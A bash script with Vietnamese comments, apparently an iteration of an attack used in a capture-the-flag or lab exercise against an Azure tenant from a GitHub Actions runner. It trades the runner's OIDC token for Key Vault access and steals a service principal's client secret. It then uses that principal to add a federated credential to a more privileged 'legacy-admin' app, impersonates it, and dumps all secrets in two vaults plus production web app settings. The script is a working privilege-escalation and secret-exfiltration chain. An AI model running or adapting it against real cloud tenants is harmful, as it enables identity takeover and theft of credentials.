#!/usr/bin/env bash
# v9 — sync-service-principal ghi FIC lên tbl-legacy-admin (đã xác nhận ở v7),
#      chờ propagate + retry exchange, rồi đọc kv-tbl-sec-x3euoz.
set +e
TEN="${AZURE_TENANT_ID}"
SEC=kv-tbl-sec-x3euoz; PROD=kv-tbl-prod-x3euoz
LEGACY_OID=22a3fb7e-860a-4708-9e50-3d36aa21191c
LEGACY_APP=891fb158-e02c-4428-a885-53b811f369c0
WRITER_APP=462d1c38-4459-48b8-9333-82e389e59514      # sync-service-principal
TAG="h$RANDOM"

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
SUBJ=$(echo "$GHTOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
      | python3 -c "import sys,json;print(json.load(sys.stdin)['sub'])")
echo "[*] sub=$SUBJ"
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")

# lấy secret của sync-service-principal
WSECRET=$(curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
  | python3 -c "
import sys,json
print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
[ -z "$WSECRET" ] && { echo "[!] không lấy được secret writer"; exit 0; }

G=$(tok_sp "$WRITER_APP" "$WSECRET" "https://graph.microsoft.com/.default")
[ -z "$G" ] && { echo "[!] không có graph token"; exit 0; }
echo "[*] graph token OK (sync-service-principal)"

# FIC hiện có trên tbl-legacy-admin
echo "--- FIC hiện có:"
curl -sS -H "Authorization: Bearer $G" \
  "https://graph.microsoft.com/v1.0/applications/$LEGACY_OID/federatedIdentityCredentials" \
  | python3 -c "
import sys,json
for f in json.load(sys.stdin).get('value',[]):
    print('   ',f['name'],'|',f['issuer'],'|',f['subject'])" 2>/dev/null

BODY=$(python3 -c "
import json,sys
print(json.dumps({'name':'f-'+sys.argv[1],
 'issuer':'https://token.actions.githubusercontent.com',
 'subject':sys.argv[2],'audiences':['api://AzureADTokenExchange']}))" "$TAG" "$SUBJ")
R=$(curl -sS -X POST -H "Authorization: Bearer $G" -H 'Content-Type: application/json' \
    -d "$BODY" "https://graph.microsoft.com/v1.0/applications/$LEGACY_OID/federatedIdentityCredentials")
echo "$R" | grep -q '"error"' && echo "[!] FIC: $(echo "$R" | head -c 200)" || echo "[*] FIC đã thêm: f-$TAG"

AT=""
for i in 1 2 3 4 5 6 7 8; do
  sleep 15
  GHTOK=$(gh_tok "api://AzureADTokenExchange")   # token mới mỗi vòng (hạn 5 phút)
  RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$LEGACY_APP" -d "scope=https://vault.azure.net/.default" -d grant_type=client_credentials \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$GHTOK")
  AT=$(echo "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  if [ -n "$AT" ]; then echo "[*] ĐĂNG NHẬP THÀNH tbl-legacy-admin (vòng $i)"; break; fi
  echo "   vòng $i: $(echo "$RESP" | python3 -c "
import sys,json
try: print(json.load(sys.stdin).get('error_description','')[:120])
except Exception: print('?')")"
done
[ -z "$AT" ] && { echo "[!] exchange thất bại"; exit 0; }

for V in "$SEC" "$PROD"; do
  L=$(curl -sS -H "Authorization: Bearer $AT" "https://$V.vault.azure.net/secrets?api-version=7.4")
  echo "$L" | grep -q '"error"' && { echo "  $V: denied"; continue; }
  echo "  $V: OK"
  for SID in $(echo "$L" | python3 -c "
import sys,json
for s in json.load(sys.stdin).get('value',[]): print(s['id'])"); do
    echo "  --- $SID"
    curl -sS -H "Authorization: Bearer $AT" "$SID?api-version=7.4" | head -c 1500; echo
  done
done

# ARM với danh tính legacy-admin (phòng khi flag nằm ở app settings / storage)
ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$LEGACY_APP" -d "scope=https://management.azure.com/.default" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$(gh_tok api://AzureADTokenExchange)" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
if [ -n "$ARM" ]; then
  echo "--- app settings (legacy-admin)"
  for SITE in app-tbl-storefront-prod app-tbl-reporting-prod; do
    curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
     "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-03-01" | head -c 2000; echo
  done
fi
echo "================ DONE ================"
